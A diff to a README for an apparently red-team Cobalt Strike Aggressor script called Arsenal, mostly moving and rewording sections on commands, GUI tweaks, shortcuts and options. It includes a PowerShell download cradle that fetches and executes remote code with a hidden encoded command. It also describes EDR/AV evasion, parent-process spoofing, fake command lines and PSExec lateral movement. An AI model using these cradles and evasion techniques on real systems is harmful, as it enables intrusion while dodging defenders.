@@ -16,33 +16,7 @@ UI embellishes, parsing of Beacon-events data (tasked, output, input, etc), powe
 
 ---
 
-### 1. Customized Powershell Command & Download Cradle:
-
-This script introduces several different methods for Powershell download and execution primitives, other
-than `(Net.WebClient).DownloadString` and `IEX()`:
-
-```
-   set POWERSHELL_DOWNLOAD_CRADLE {
-       return "IEX (New-Object Net.Webclient).DownloadString(' $+ $1 $+ ')";
-   }
-   [...]
-
-   set POWERSHELL_COMMAND {
-   [...]
-       return "powershell -nop -w hidden -encodedcommand $script";
-   }
-```
-
-Aforementioned methods are heavily flagged these days by
-EDRs and AVs so we would prefer to avoid their use. It so happens that Cobalt Strike by default embeds them 
-excessively, generating lot of noise in such systems. We can tell Cobalt Strike to structure it's Powershell
-use patterns differently. However, some of introduced custom methods may not work. In such situations, we
-can always switch back to battle tested Cobalt Strike defaults by choosing "Use unsafe Powershell.." 
-to Always. 
-
----
-
-### 2. Goodies included:
+### 1. Batteries included:
 
 - adds command `autoppid` for automatically finding suitable PPID and setting it
 - adds command `getdomain` to quickly return joined domain name
@@ -109,7 +83,7 @@ to Always.
 
 ---
 
-### 3. When a new Beacon checks in - here's what happens
+### 2. When a new Beacon checks in - here's what happens
 
 Every below behaviour is controlled via Arsenal's settings, deciding whether these actions should be run. Therefore its possible to turn all of them off.
 
@@ -124,6 +98,34 @@ Every below behaviour is controlled via Arsenal's settings, deciding whether the
    5. User defined in _"Beacon Initial Actions Setup"_ automated argue commands are executed.
    6. Lastly, PowerView.ps1 will be imported using `import-powerview` alias.
 
+
+---
+
+### 3. Customized Powershell Command & Download Cradle:
+
+This script introduces several different methods for Powershell download and execution primitives, other
+than `(Net.WebClient).DownloadString` and `IEX()`:
+
+```
+   set POWERSHELL_DOWNLOAD_CRADLE {
+       return "IEX (New-Object Net.Webclient).DownloadString(' $+ $1 $+ ')";
+   }
+   [...]
+
+   set POWERSHELL_COMMAND {
+   [...]
+       return "powershell -nop -w hidden -encodedcommand $script";
+   }
+```
+
+Aforementioned methods are heavily flagged these days by
+EDRs and AVs so we would prefer to avoid their use. It so happens that Cobalt Strike by default embeds them 
+excessively, generating lot of noise in such systems. We can tell Cobalt Strike to structure it's Powershell
+use patterns differently. However, some of introduced custom methods may not work. In such situations, we
+can always switch back to battle tested Cobalt Strike defaults by choosing "Use unsafe Powershell.." 
+to Always. 
+
+---
 
 ### 4. GUI improvements
    
@@ -140,8 +142,10 @@ Every below behaviour is controlled via Arsenal's settings, deciding whether the
 
    - adds Arsenal's specific Beacon comments, such as Beacon-number, first-checkin, ppid, sleep time, etc. to status bar (position marked as "3")
 
-   - every 15 seconds renames Beacons tabs according to configured format.
+   - renames Beacons tabs every 15 seconds according to a configured format.
 
+
+---
 
 ### 5. Keyboard shortcuts bound
 
@@ -162,6 +166,8 @@ Every below behaviour is controlled via Arsenal's settings, deciding whether the
    - `Ctrl+Y`            - Opens target browser
 
 
+---
+
 ### 6. Options
 
    Options control some of the decisions script make. Settings are saved & loaded from an external file.
@@ -173,27 +179,27 @@ Every below behaviour is controlled via Arsenal's settings, deciding whether the
 
    ![Arsenal's options](img/arsenal2.png)
 
-   - "On initial Beacon check-in do all the automated stuff" - controls whether we should issue all of the 
+   - _"On initial Beacon check-in do all the automated stuff"_ - controls whether we should issue all of the 
        automated stuff described in `When a new Beacon checks in - here's what happens` section above.
-   - "Specify local path where to save downloaded files" - to be used by auto-sync-downloaded-files logic
-   - "Specify local path .NET assemblies should be looked for" - to be used if execute-assembly didn't find
+   - _"Specify local path where to save downloaded files"_ - to be used by auto-sync-downloaded-files logic
+   - _"Specify local path .NET assemblies should be looked for"_ - to be used if execute-assembly didn't find
        specified assembly's name as a lookup directory, similarly to $PATH concept.
-   - "During a manual 'syncall' what to do with already existing files?" - skip them? overwrite?
-   - "Set this to let the script append valuable information..." - when enabled, this script will put 
+   - _"During a manual 'syncall' what to do with already existing files?"_ - skip them? overwrite?
+   - _"Set this to let the script append valuable information..."_ - when enabled, this script will put 
        Beacon's metadata to it's Notes
-   - "Fake PPID on initial Beacon check-in"
-   - "Preset new Beacons with argue fake command lines." - when checked, will issue "argue" for typically
+   - _"Fake PPID on initial Beacon check-in"_
+   - _"Preset new Beacons with argue fake command lines."_ - when checked, will issue "argue" for typically
        used processes: Powershell, Cmd
-   - "Use unsafe but stable Powershell [...] methods" - fall back on default Cobalt Strike PS download cradles.
+   - _"Use unsafe but stable Powershell [...] methods"_ - fall back on default Cobalt Strike PS download cradles.
        Select to Never to totally avoid them, seldom to use them at random and Always to disable custom ones.
-   - "Enable debug output in Script Console"
-   - "Process name to spoof as parent in PPID"
-   - "Service name(s) to use in PSExec lateral movement" - comma-separeted list of service names to be used
+   - _"Enable debug output in Script Console"_
+   - _"Process name to spoof as parent in PPID"_
+   - _"Service name(s) to use in PSExec lateral movement"_ - comma-separeted list of service names to be used
        by Cobalt Strike when doing jump psexec/psexec64
 
 ---
 
-### Acknowledgements
+### Credits
 
 This Aggressor script stands on the shoulder of giants utilising their splendid work:
 
